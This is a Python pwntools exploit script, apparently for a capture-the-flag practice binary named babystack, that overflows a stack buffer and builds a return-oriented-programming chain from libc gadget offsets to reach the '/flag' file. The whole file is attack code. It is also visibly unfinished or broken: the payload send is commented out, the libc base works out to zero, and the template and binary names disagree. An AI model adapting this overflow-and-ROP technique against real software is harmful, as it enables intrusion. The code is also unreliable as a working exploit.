#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babystack_level7
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babystack_level9')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled


def rop(base, rbp):
    pop_rdi = [base+0x23b6a, rbp]
    pop_rsi = [base+0x2601f, 0x4]
    syscall = [base+0x10db60] 
    chain = b''.join(map(p64, pop_rdi + pop_rsi + syscall))
    return chain 

io = start()
io.recvuntil(b"base pointer rbp: ")
bp = int(io.recvline(keepends=False), 16)
print(bp)

io.recvuntil(b"will be stored: ")
buf = int(io.recvline(keepends=False), 16)
print(buf)

libc_sys = 0x52290
libc_base = libc_sys - 0x52290 

payload = b'a'*(bp-buf)+b'/flag' +b'\0'*3 + rop(libc_base, bp)
# io.sendline(payload)

io.interactive()


